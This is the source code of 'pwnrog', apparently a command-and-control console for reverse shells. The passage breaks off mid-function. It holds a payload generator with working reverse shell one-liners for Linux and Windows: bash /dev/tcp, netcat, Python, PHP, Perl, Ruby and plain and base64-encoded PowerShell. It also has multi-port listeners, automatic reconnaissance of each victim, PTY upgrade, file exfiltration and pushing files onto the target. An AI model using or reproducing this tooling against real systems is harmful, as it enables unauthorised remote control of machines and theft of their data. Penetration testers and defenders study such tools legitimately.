#!/usr/bin/env python3
"""
Pwnrog - Reverse Shell Handler
Interactive console with multi-port listeners, session management, and PTY upgrade
"""

import argparse
import socket
import threading
import select
import sys
import os
import time
import struct
import fcntl
import base64
import readline
from datetime import datetime


# ANSI Colors
class Colors:
    CYAN = '\033[96m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    RESET = '\033[0m'


class Banner:
    NAME = "pwnrog"
    VERSION = "0.1-beta"
    
    @classmethod
    def show(cls):
        """Display the banner"""
        name_display = f"{Colors.BOLD}{cls.NAME}{Colors.RESET}{Colors.RED}"
        print(f"""{Colors.RED}
  ⠀⠀⠀⠀⠀⠀⠀⣠⣒⣪⡝⠃⠀⠀⠀⠀⠀⠀⠀⣀⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣶⣿⣿⣷⡀⠀⠀⣀⣄⢠⣾⣿⣿⣷⣴⠂⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣷⣴⣿⣿⠏⣾⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠁⣼⣿⣿⣿⣽⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⠁⣀⣿⣿⣿⣿⡻⣿⣟⠆⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣠⣤⠶⢿⠟⠙⢻⣿⣿⣿⣿⠃⠘⣿⣿⣿⣿⡟⠋⣛⡿⣷⠦⣄⣀⠀⠀
⢀⣴⠋⠁⣾⣿⣿⣿⣷⣄⣹⣿⣿⠟⠀⠀⠛⣿⣿⣯⣴⣾⣿⣿⣿⣷⠀⠙⢷⡀
⠉⠁⠀⠀⠙⢿⡿⣿⣿⣷⣿⣿⣿⠀⠀⠀⠀⣿⣿⣿⣾⣿⣿⢿⡿⠃⠀⠀⠈⠁
⠀⠀⠀⠀⠀⠈⢻⣟⣿⣿⣿⣿⡟⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣿⣿⣯⠉⠁⠀⠀⠀⠀⣰⠃⠈⠉⢿⣿⣿⢄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠨⠿⠿⠁⠀⠀⠀⠀⠀⠀⣼⠁⠀⠀⣀⡠⠬⢿⠿⠭⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠥⠤⠄⠐⠊⠀⠀⠀⠀⠀⠀⠀

    {name_display} v{cls.VERSION}
    {Colors.YELLOW}Type '{Colors.BOLD}help{Colors.RESET}{Colors.YELLOW}' for available commands{Colors.RESET}
""")


class PayloadGenerator:
    """Generate reverse shell payloads for various OS and types"""
    
    # Linux payloads
    LINUX_PAYLOADS = {
        'bash': 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
        'bash2': '/bin/bash -l > /dev/tcp/{lhost}/{lport} 0<&1 2>&1',
        'python': "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        'python3': "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        'nc': 'nc -e /bin/sh {lhost} {lport}',
        'nc_mkfifo': 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
        'php': "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'perl': "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        'ruby': "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    }
    
    # Windows payloads
    WINDOWS_PAYLOADS = {
        'powershell': "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        'powershell_b64': "powershell -e {b64_payload}",
        'nc': 'nc.exe -e cmd.exe {lhost} {lport}',
        'python': "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])\"",
    }
    
    @classmethod
    def get_types(cls, os_type):
        """Get available payload types for an OS"""
        if os_type.lower() == 'linux':
            return list(cls.LINUX_PAYLOADS.keys())
        elif os_type.lower() == 'windows':
            return list(cls.WINDOWS_PAYLOADS.keys())
        return []
    
    @classmethod
    def generate(cls, lhost, lport, os_type=None, payload_type=None):
        """Generate a payload with the given parameters"""
        import random
        
        # Default to random OS if not specified
        if os_type is None:
            os_type = random.choice(['linux', 'windows'])
        
        os_type = os_type.lower()
        
        # Get payloads for selected OS
        if os_type == 'linux':
            payloads = cls.LINUX_PAYLOADS
        elif os_type == 'windows':
            payloads = cls.WINDOWS_PAYLOADS
        else:
            return None, None, None
        
        # Default to random type if not specified
        if payload_type is None:
            payload_type = random.choice(list(payloads.keys()))
        
        payload_type = payload_type.lower()
        
        if payload_type not in payloads:
            return None, None, None
        
        # Special handling for powershell_b64
        if payload_type == 'powershell_b64':
            # Create the PowerShell command to encode
            ps_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
            # Encode as UTF-16LE (PowerShell's expected encoding for -e flag)
            b64_payload = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
            payload = f"powershell -e {b64_payload}"
        else:
            # Generate payload normally
            payload = payloads[payload_type].format(lhost=lhost, lport=lport)
        
        return payload, os_type, payload_type
    
    @classmethod
    def copy_to_clipboard(cls, text):
        """Copy text to clipboard"""
        try:
            import subprocess
            process = subprocess.Popen(['xclip', '-selection', 'clipboard'], stdin=subprocess.PIPE)
            process.communicate(text.encode())
            return True
        except:
            return False


def info(msg):
    print(f"[{Colors.CYAN}INFO{Colors.RESET}] {msg}")


def warn(msg):
    print(f"[{Colors.YELLOW}WARN{Colors.RESET}] {msg}")


def error(msg):
    print(f"[{Colors.MAGENTA}ERROR{Colors.RESET}] {msg}")


def done(msg):
    print(f"[{Colors.GREEN}DONE{Colors.RESET}] {msg}")


def get_interface_ip(interface):
    """Get IP address of a network interface"""
    try:
        import fcntl
        import struct
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip = socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', interface[:15].encode())
        )[20:24])
        return ip
    except:
        return None


class Session:
    """Manages a connected reverse shell session"""
    _id_counter = 0
    _lock = threading.Lock()

    def __init__(self, conn, addr, listener_port):
        with Session._lock:
            Session._id_counter += 1
            self.id = Session._id_counter
        self.conn = conn
        self.addr = addr
        self.listener_port = listener_port
        self.connected_at = datetime.now()
        self.is_pty = False
        self.os_type = "Unknown"
        self.hostname = "Unknown"
        self.user = "Unknown"
        self.active = True
        self._detect_info()

    def _detect_info(self):
        """Detect OS, hostname, and user from the session"""
        try:
            self.conn.settimeout(2)
            # Clear any pending data
            try:
                self.conn.recv(4096, socket.MSG_DONTWAIT)
            except:
                pass

            # Detect OS
            self.conn.send(b"uname -s 2>/dev/null || echo Windows\n")
            time.sleep(0.5)
            response = self.conn.recv(4096).decode(errors='ignore').strip()
            lines = [l.strip() for l in response.split('\n') if l.strip() and 'uname' not in l]
            if lines:
                os_name = lines[-1].lower()
                if 'linux' in os_name:
                    self.os_type = "Linux"
                elif 'darwin' in os_name:
                    self.os_type = "macOS"
                elif 'windows' in os_name or 'microsoft' in os_name:
                    self.os_type = "Windows"
                else:
                    self.os_type = lines[-1][:10]

            # Detect hostname
            self.conn.send(b"hostname 2>/dev/null\n")
            time.sleep(0.3)
            response = self.conn.recv(4096).decode(errors='ignore').strip()
            lines = [l.strip() for l in response.split('\n') if l.strip() and 'hostname' not in l]
            if lines:
                self.hostname = lines[-1][:20]

            # Detect user
            self.conn.send(b"whoami 2>/dev/null\n")
            time.sleep(0.3)
            response = self.conn.recv(4096).decode(errors='ignore').strip()
            lines = [l.strip() for l in response.split('\n') if l.strip() and 'whoami' not in l]
            if lines:
                self.user = lines[-1][:15]

            self.conn.settimeout(None)
        except Exception as e:
            self.conn.settimeout(None)

    def upgrade_to_pty(self):
        """Upgrade shell to full PTY"""
        if self.is_pty:
            return True

        try:
            # Python PTY upgrade
            pty_cmd = (
                "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || "
                "python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || "
                "script -qc /bin/bash /dev/null 2>/dev/null\n"
            )
            self.conn.send(pty_cmd.encode())
            time.sleep(0.5)

            # Set terminal
            self.conn.send(b"export TERM=xterm-256color\n")
            time.sleep(0.2)
            self.conn.send(b"stty rows 40 cols 150\n")
            time.sleep(0.2)

            self.is_pty = True
            return True
        except Exception as e:
            return False

    def send_command(self, cmd):
        """Send command and receive output"""
        try:
            self.conn.send(f"{cmd}\n".encode())
            time.sleep(0.3)
            self.conn.settimeout(1)
            output = b""
            while True:
                try:
                    data = self.conn.recv(4096)
                    if not data:
                        break
                    output += data
                except socket.timeout:
                    break
            self.conn.settimeout(None)
            
            # Clean the output
            result = output.decode(errors='ignore')
            lines = result.split('\n')
            
            # Remove the echoed command (first line if it matches)
            if lines and cmd in lines[0]:
                lines = lines[1:]
            
            # Remove trailing prompt lines (lines ending with $ or # or containing the prompt)
            while lines and (lines[-1].strip().endswith('$') or 
                           lines[-1].strip().endswith('#') or 
                           lines[-1].strip() == '' or
                           '@' in lines[-1] and ':' in lines[-1]):
                lines.pop()
            
            return '\n'.join(lines)
        except:
            return ""

    def interactive_shell(self):
        """Enter interactive shell mode"""
        import termios
        import tty

        info(f"Entering shell for session {self.id}. Press Ctrl+] to exit.")

        old_settings = termios.tcgetattr(sys.stdin)
        try:
            # Drain any pending output from PTY upgrade
            self.conn.setblocking(False)
            try:
                while True:
                    data = self.conn.recv(4096)
                    if not data:
                        break
            except BlockingIOError:
                pass
            except:
                pass

            # Send Enter to get a fresh prompt
            self.conn.setblocking(True)
            self.conn.send(b"\n")
            time.sleep(0.1)
            self.conn.setblocking(False)

            tty.setraw(sys.stdin.fileno())

            while self.active:
                readable, _, _ = select.select([sys.stdin, self.conn], [], [], 0.1)

                if sys.stdin in readable:
                    char = sys.stdin.read(1)
                    if char == '\x1d':  # Ctrl+]
                        break
                    try:
                        self.conn.send(char.encode())
                    except:
                        break

                if self.conn in readable:
                    try:
                        data = self.conn.recv(4096)
                        if not data:
                            break
                        sys.stdout.write(data.decode(errors='ignore'))
                        sys.stdout.flush()
                    except BlockingIOError:
                        pass
                    except:
                        break

        finally:
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
            self.conn.setblocking(True)
            print()

    def download(self, remote_path, local_path, debug=False):
        """Download file from target (auto-selects best method)"""
        # First try base64 method for small files
        success = self._download_base64(remote_path, local_path, debug)
        if success:
            return True
        
        # Fallback to HTTP method for large files
        if debug:
            print("[DEBUG] Base64 failed, trying HTTP method...")
        return self._download_http(remote_path, local_path, debug)
    
    def _download_base64(self, remote_path, local_path, debug=False):
        """Download using base64 encoding (best for small files)"""
        try:
            marker_start = "DLSTART"
            marker_end = "DLEND"
            cmd = f"echo {marker_start}; base64 \"{remote_path}\"; echo {marker_end}\n"
            self.conn.send(cmd.encode())
            
            time.sleep(1)
            
            self.conn.settimeout(30)
            data = b""
            start_time = time.time()
            max_time = 60  # 1 minute max for base64 method
            last_recv_time = time.time()
            
            while time.time() - start_time < max_time:
                try:
                    chunk = self.conn.recv(8192)
                    if chunk:
                        data += chunk
                        last_recv_time = time.time()
                        if marker_end.encode() in data:
                            break
                    else:
                        break
                except socket.timeout:
                    if marker_end.encode() in data:
                        break
                    if time.time() - last_recv_time < 30:
                        continue
                    break
            
            self.conn.settimeout(None)
            
            output = data.decode(errors='ignore').replace('\r\n', '\n').replace('\r', '\n')
            
            import re
            start_match = re.search(r'\n' + marker_start + r'\s*\n', output)
            end_match = re.search(r'\n' + marker_end + r'\s*\n?', output)
            
            if start_match and end_match:
                b64_content = output[start_match.end():end_match.start()].strip()
                lines = b64_content.split('\n')
                clean_lines = [l.strip() for l in lines if l.strip() and re.fullmatch(r'[A-Za-z0-9+/=]+', l.strip())]
                b64_data = ''.join(clean_lines)
                
                if b64_data:
                    decoded = base64.b64decode(b64_data)
                    with open(local_path, 'wb') as f:
                        f.write(decoded)
                    return True
            return False
        except:
            return False
    
    def _download_http(self, remote_path, local_path, debug=False):
        """Download using HTTP server (best for large files)"""
        try:
            import subprocess
            import random
            
            # Generate random port
            port = random.randint(40000, 50000)
            
            # Get directory and filename
            dir_path = os.path.dirname(remote_path) or "."
            filename = os.path.basename(remote_path)
            
            # Start HTTP server on target
            server_cmd = f"cd \"{dir_path}\" && python3 -m http.server {port} &\n"
            self.conn.send(server_cmd.encode())
            time.sleep(2)  # Wait for server to start
            
            # Get target IP
            target_ip = self.conn.getpeername()[0]
            
            if debug:
                print(f"[DEBUG] Starting HTTP server on {target_ip}:{port}")
                print(f"[DEBUG] Downloading {filename}...")
            
            # Download file using curl or wget
            import urllib.request
            import urllib.parse
            
            encoded_filename = urllib.parse.quote(filename)
            url = f"http://{target_ip}:{port}/{encoded_filename}"
            
            try:
                urllib.request.urlretrieve(url, local_path)
                success = os.path.exists(local_path) and os.path.getsize(local_path) > 0
            except Exception as e:
                if debug:
                    print(f"[DEBUG] HTTP download error: {e}")
                success = False
            
            # Kill the HTTP server
            kill_cmd = f"pkill -f 'python3 -m http.server {port}'\n"
            self.conn.send(kill_cmd.encode())
            time.sleep(0.5)
            
            # Drain any output
            self.conn.setblocking(False)
            try:
                while True:
                    self.conn.recv(4096)
            except:
                pass
            self.conn.setblocking(True)
            
            return success
        except Exception as e:
            if debug:
                print(f"[DEBUG] HTTP method exception: {e}")
            return False

    def upload(self, local_path, remote_path):
        """Upload file to target"""
        try:
            with open(local_path, 'rb') as f:
                data = f.read()

            b64_data = base64.b64encode(data).decode()
            cmd = f"echo '{b64_data}' | base64 -d > {remote_path}\n"
            self.conn.send(cmd.encode())
            time.sleep(1)
            return True
        except Exception as e:
            return False

    def upload_from_url(self, url, remote_path):
        """Download file from URL to target using wget or curl"""
        try:
            # Try wget first, fallback to curl
            cmd = f"(wget -q -O \"{remote_path}\" \"{url}\" 2>/dev/null || curl -s -o \"{remote_path}\" \"{url}\") && echo DLSUCCESS || echo DLFAILED\n"
            self.conn.send(cmd.encode())
            
            # Wait and check result
            time.sleep(3)
            self.conn.settimeout(5)
            try:
                data = self.conn.recv(4096).decode(errors='ignore')
                return 'DLSUCCESS' in data
            except:
                return False
            finally:
                self.conn.settimeout(None)
        except Exception as e:
            return False

    def close(self):
        """Close the session"""
        self.active = False
        try:
            self.conn.close()
        except:
            pass


class Listener:
    """Manages a TCP listener on a specific port"""
    _id_counter = 0
    _lock = threading.Lock()

    def __init__(self, host, port, session_callback):
        with Listener._lock:
            Listener._id_counter += 1
            self.id = Listener._id_counter
        self.host = host
        self.port = port
        self.session_callback = session_callback
        self.sock = None
        self.active = False
        self.thread = None

    def start(self):
        """Start the listener"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
            self.sock.settimeout(1)
            self.active = True

            self.thread = threading.Thread(target=self._accept_loop, daemon=True)
            self.thread.start()
            return True
        except Exception as e:
            error(f"Failed to start listener on {self.host}:{self.port} - {e}")
            return False

    def _accept_loop(self):
        """Accept incoming connections"""
        while self.active:
            try:
                conn, addr = self.sock.accept()
                self.session_callback(conn, addr, self.port)
            except socket.timeout:
                continue
            except:
                if self.active:
                    break

    def stop(self):
        """Stop the listener"""
        self.active = False
        if self.sock:
            try:
                self.sock.close()
            except:
                pass


class Completer:
    """Tab autocomplete for pwnrog console"""

    def __init__(self, console):
        self.console = console
        self.commands = [
            'help', 'sessions', 'session', 'shell', 'upgrade',
            'download', 'upload', 'background', 'bg', 'set',
            'listeners', 'kill', 'killall', 'exit', 'quit',
            'ls', 'pwd', 'payload', 'payloads'
        ]
        self.set_options = ['lhost', 'lport']
        self.kill_options = ['listener', 'session']
        self.killall_options = ['listener', 'session']

    def complete(self, text, state):
        """Readline completer function"""
        buffer = readline.get_line_buffer()
        parts = buffer.split()

        if not parts or (len(parts) == 1 and not buffer.endswith(' ')):
            # Complete command name
            matches = [c + ' ' for c in self.commands if c.startswith(text)]
        elif parts[0] == 'set':
            if len(parts) == 1 or (len(parts) == 2 and not buffer.endswith(' ')):
                # Complete set options
                prefix = parts[1] if len(parts) > 1 else ''
                matches = [o + ' ' for o in self.set_options if o.startswith(prefix)]
            else:
                matches = []
        elif parts[0] == 'session':
            # Complete with session IDs
            prefix = parts[1] if len(parts) > 1 and not buffer.endswith(' ') else ''
            matches = [str(sid) + ' ' for sid in self.console.sessions.keys()
                      if str(sid).startswith(prefix)]
        elif parts[0] == 'kill':
            if len(parts) == 1 or (len(parts) == 2 and not buffer.endswith(' ')):
                # Complete kill target type
                prefix = parts[1] if len(parts) > 1 else ''
                matches = [o + ' ' for o in self.kill_options if o.startswith(prefix)]
            elif len(parts) >= 2:
                # Complete with IDs
                prefix = parts[2] if len(parts) > 2 and not buffer.endswith(' ') else ''
                if parts[1] == 'listener':
                    matches = [str(lid) for lid in self.console.listeners.keys()
                              if str(lid).startswith(prefix)]
                elif parts[1] == 'session':
                    matches = [str(sid) for sid in self.console.sessions.keys()
                              if str(sid).startswith(prefix)]
                else:
                    matches = []
            else:
                matches = []
        elif parts[0] == 'killall':
            if len(parts) == 1 or (len(parts) == 2 and not buffer.endswith(' ')):
                prefix = parts[1] if len(parts) > 1 else ''
                matches = [o for o in self.killall_options if o.startswith(prefix)]
            else:
                matches = []
        elif parts[0] == 'payload':
            # Get current text being typed
            current = parts[-1] if not buffer.endswith(' ') else ''
            
            # Check what's already been specified
            has_os = any(p.startswith('os=') for p in parts[1:])
            has_type = any(p.startswith('type=') for p in parts[1:])
            
            # Get specified OS if any
            specified_os = None
            for p in parts[1:]:
                if p.startswith('os='):
                    specified_os = p[3:]
                    break
            
            # Build available options based on what's typed
            if current.startswith('type='):
                # Complete type values
                type_prefix = current[5:]
                if specified_os:
                    types = PayloadGenerator.get_types(specified_os)
                else:
                    types = PayloadGenerator.get_types('linux') + PayloadGenerator.get_types('windows')
                matches = ['type=' + t for t in types if t.startswith(type_prefix)]
            elif current.startswith('os='):
                # Complete OS values
                os_prefix = current[3:]
                os_options = ['linux', 'windows']
                matches = ['os=' + o for o in os_options if o.startswith(os_prefix)]
            else:
                # Show available options not yet specified
                options = []
                if not has_os:
                    options.extend(['os=linux', 'os=windows'])
                if not has_type:
                    options.append('type=')
                matches = [o for o in options if o.startswith(current)]
        else:
            matches = []

        try:
            return matches[state]
        except IndexError:
            return None


class Console:
    """Interactive console for pwnrog"""

    def __init__(self, lhost='0.0.0.0', lports=None):
        self.lhost = lhost
        self.lports = lports if lports else [1337]
        self.listeners = {}  # id -> Listener
        self.sessions = {}   # id -> Session
        self.current_session = None
        self.running = True
        self._setup_readline()

    def get_prompt(self):
        """Get the current prompt string"""
        # Use \001 and \002 to wrap non-printing characters for readline
        RL_PROMPT_START = '\001'
        RL_PROMPT_END = '\002'
        
        red = f"{RL_PROMPT_START}{Colors.RED}{RL_PROMPT_END}"
        green = f"{RL_PROMPT_START}{Colors.GREEN}{RL_PROMPT_END}"
        bold = f"{RL_PROMPT_START}{Colors.BOLD}{RL_PROMPT_END}"
        reset = f"{RL_PROMPT_START}{Colors.RESET}{RL_PROMPT_END}"
        
        if self.current_session:
            return f"{red}{bold}pwnrog{reset} [{green}{self.current_session.id}{reset}] > "
        return f"{red}{bold}pwnrog{reset} > "

    def _setup_readline(self):
        """Setup readline with tab completion and history"""
        self.history_file = os.path.expanduser('~/.pwnrog_history')
        self.completer = Completer(self)
        readline.set_completer(self.completer.complete)
        readline.parse_and_bind('tab: complete')
        readline.set_completer_delims(' ')

        # Load history from file
        try:
            if os.path.exists(self.history_file):
                readline.read_history_file(self.history_file)
        except:
            pass

    def _save_history(self):
        """Save command history to file"""
        try:
            readline.write_history_file(self.history_file)
        except:
            pass

    def on_new_session(self, conn, addr, listener_port):
        """Callback when new session connects"""
        session = Session(conn, addr, listener_port)
        self.sessions[session.id] = session

        print()
        done(f"New session {session.id} from {addr[0]}:{addr[1]} on port {listener_port}")
        info(f"Session info: {session.user}@{session.hostname} ({session.os_type})")

        # Auto upgrade to PTY
        if session.upgrade_to_pty():
            done(f"Session {session.id} upgraded to PTY")
        else:
            warn(f"Failed to upgrade session {session.id} to PTY")

        print(self.get_prompt(), end='', flush=True)

    def start_listeners(self):
        """Start all configured listeners"""
        for port in self.lports:
            if any(l.port == port and l.active for l in self.listeners.values()):
                continue  # Already listening on this port

            listener = Listener(self.lhost, port, self.on_new_session)
            if listener.start():
                self.listeners[listener.id] = listener
                info(f"Listener {listener.id} started on {self.lhost}:{port}")

    def cmd_help(self, args):
        """Show help message"""
        print(f"""
{Colors.BOLD}Main Commands:{Colors.RESET}

  {Colors.GREEN}help{Colors.RESET}                          Show this help message
  {Colors.GREEN}sessions{Colors.RESET}                      List all connected sessions
  {Colors.GREEN}session <id>{Colors.RESET}                  Interact with a specific session
  {Colors.GREEN}shell{Colors.RESET}                         Enter interactive shell (requires active session)
  {Colors.GREEN}upgrade{Colors.RESET}                       Upgrade current session to full PTY
  {Colors.GREEN}download <remote> <local>{Colors.RESET}     Download file from target
  {Colors.GREEN}upload <local> <remote>{Colors.RESET}       Upload file to target
  {Colors.GREEN}ls [path]{Colors.RESET}                     List local directory
  {Colors.GREEN}pwd{Colors.RESET}                           Print local working directory
  {Colors.GREEN}background{Colors.RESET} / {Colors.GREEN}bg{Colors.RESET}               Background current session

{Colors.BOLD}Payload Commands:{Colors.RESET}

  {Colors.GREEN}payload{Colors.RESET}                       Generate random payload
  {Colors.GREEN}payload os=<linux|windows>{Colors.RESET}    Generate payload for specific OS
  {Colors.GREEN}payload type=<type>{Colors.RESET}           Generate specific payload type
  {Colors.GREEN}payloads{Colors.RESET}                      List available payload types

{Colors.BOLD}Configuration Commands:{Colors.RESET}

  {Colors.GREEN}set lhost <ip/interface>{Colors.RESET}      Set listener IP or interface
  {Colors.GREEN}set lport <port1,port2,...>{Colors.RESET}   Set listener ports (comma-separated)
  {Colors.GREEN}listeners{Colors.RESET}                     List all listeners

{Colors.BOLD}Control Commands:{Colors.RESET}

  {Colors.GREEN}kill listener <id>{Colors.RESET}            Kill a specific listener
  {Colors.GREEN}kill session <id>{Colors.RESET}             Kill a specific session
  {Colors.GREEN}killall listener{Colors.RESET}              Kill all listeners
  {Colors.GREEN}killall session{Colors.RESET}               Kill all sessions
  {Colors.GREEN}exit{Colors.RESET} / {Colors.GREEN}quit{Colors.RESET}                   Exit
""")

    def cmd_sessions(self, args):
        """List all sessions"""
        if not self.sessions:
            warn("No active sessions")
            return

        print(f"\n{Colors.BOLD}Active Sessions:{Colors.RESET}\n")
        print(f"  {'ID':<5} {'IP':<18} {'Port':<8} {'User':<15} {'Hostname':<20} {'OS':<10} {'PTY':<5}")
        print(f"  {'-'*5} {'-'*18} {'-'*8} {'-'*15} {'-'*20} {'-'*10} {'-'*5}")

        for sid, session in self.sessions.items():
            if session.active:
                pty_status = "Yes" if session.is_pty else "No"
                print(f"  {sid:<5} {session.addr[0]:<18} {session.listener_port:<8} {session.user:<15} {session.hostname:<20} {session.os_type:<10} {pty_status:<5}")
        print()

    def cmd_session(self, args):
        """Interact with a session"""
        if not args:
            error("Usage: session <id>")
            return

        try:
            sid = int(args[0])
            if sid in self.sessions and self.sessions[sid].active:
                self.current_session = self.sessions[sid]
                done(f"Interacting with session {sid}")
            else:
                error(f"Session {sid} not found or inactive")
        except ValueError:
            error("Invalid session ID")

    def cmd_shell(self, args):
        """Enter interactive shell"""
        if not self.current_session:
            error("No active session. Use 'session <id>' first")
            return

        if not self.current_session.active:
            error("Session is no longer active")
            self.current_session = None
            return

        self.current_session.interactive_shell()

    def cmd_upgrade(self, args):
        """Upgrade current session to PTY"""
        if not self.current_session:
            error("No active session. Use 'session <id>' first")
            return

        if self.current_session.is_pty:
            warn("Session is already upgraded to PTY")
            return

        if self.current_session.upgrade_to_pty():
            done("Session upgraded to PTY")
        else:
            error("Failed to upgrade session to PTY")

    def cmd_download(self, args):
        """Download file from target"""
        if not self.current_session:
            error("No active session. Use 'session <id>' first")
            return

        if len(args) < 2:
            error("Usage: download <remote_path> <local_path>")
            return

        remote_path, local_path = args[0], args[1]
        info(f"Downloading {remote_path} to {local_path}...")

        if self.current_session.download(remote_path, local_path):
            done(f"Downloaded {remote_path} to {local_path}")
        else:
            error("Download failed")

    def cmd_upload(self, args):
        """Upload file to target (supports local files and URLs)"""
        if not self.current_session:
            error("No active session. Use 'session <id>' first")
            return

        if len(args) < 2:
            error("Usage: upload <local_path|url> <remote_path>")
            return

        source, remote_path = args[0], args[1]
        
        # Check if source is a URL
        if source.startswith('http://') or source.startswith('https://'):
            info(f"Downloading {source} to {remote_path} on target...")
            
            if self.current_session.upload_from_url(source, remote_path):
                done(f"Downloaded {source} to {remote_path}")
            else:
                error("Download failed")
        else:
            # Local file upload
            local_path = os.path.expanduser(source)

            if not os.path.exists(local_path):
                error(f"Local file not found: {local_path}")
                return

            info(f"Uploading {local_path} to {remote_path}...")

            if self.current_session.upload(local_path, remote_path):
                done(f"Uploaded {local_path} to {remote_path}")
            else:
                error("Upload failed")

    def cmd_background(self, args):
        """Background current session"""
        if self.current_session:
            info(f"Backgrounding session {self.current_session.id}")
            self.current_session = None
        else:
            warn("No active session to background")

    def cmd_ls(self, args):
        """List local directory"""
        path = args[0] if args else "."
        import subprocess
        try:
            result = subprocess.run(['ls', '-la', path], capture_output=True, text=True)
            print(result.stdout.rstrip())
            if result.stderr:
                print(result.stderr)
        except Exception as e:
            error(f"Failed to list directory: {e}")

    def cmd_pwd(self, args):
        """Print local working directory"""
        print(os.getcwd())

    def cmd_set(self, args):
        """Set configuration options"""
        if len(args) < 2:
            error("Usage: set <lhost|lport> <value>")
            return

        option = args[0].lower()
        value = args[1]

        if option == 'lhost':
            # Check if it's an interface name
            ip = get_interface_ip(value)
            if ip:
                self.lhost = ip
                done(f"Set lhost to {ip} (from interface {value})")
            else:
                self.lhost = value
                done(f"Set lhost to {value}")

            # Restart listeners with new host
            info("Restarting listeners with new host...")
            for listener in list(self.listeners.values()):
                listener.stop()
            self.listeners.clear()
            Listener._id_counter = 0
            self.start_listeners()

        elif option == 'lport':
            try:
                new_ports = [int(p.strip()) for p in value.split(',')]
                
                # Get currently active ports
                active_ports = [l.port for l in self.listeners.values() if l.active]
                
                # Find ports that are already listening
                existing = [p for p in new_ports if p in active_ports]
                to_add = [p for p in new_ports if p not in active_ports]
                
                if existing:
                    warn(f"Already listening on port(s): {', '.join(map(str, existing))}")
                
                if to_add:
                    # Add new ports to lports list
                    for port in to_add:
                        if port not in self.lports:
                            self.lports.append(port)
                    done(f"Adding listener(s) on port(s): {', '.join(map(str, to_add))}")
                    self.start_listeners()
                elif not existing:
                    done(f"Set lport to {', '.join(map(str, new_ports))}")
                    self.lports = new_ports
                    self.start_listeners()
            except ValueError:
                error("Invalid port number")
        else:
            error(f"Unknown option: {option}")

    def cmd_listeners(self, args):
        """List all listeners"""
        if not self.listeners:
            warn("No active listeners")
            return

        print(f"\n{Colors.BOLD}Active Listeners:{Colors.RESET}\n")
        print(f"  {'ID':<5} {'Host':<18} {'Port':<8} {'Status':<10}")
        print(f"  {'-'*5} {'-'*18} {'-'*8} {'-'*10}")

        for lid, listener in self.listeners.items():
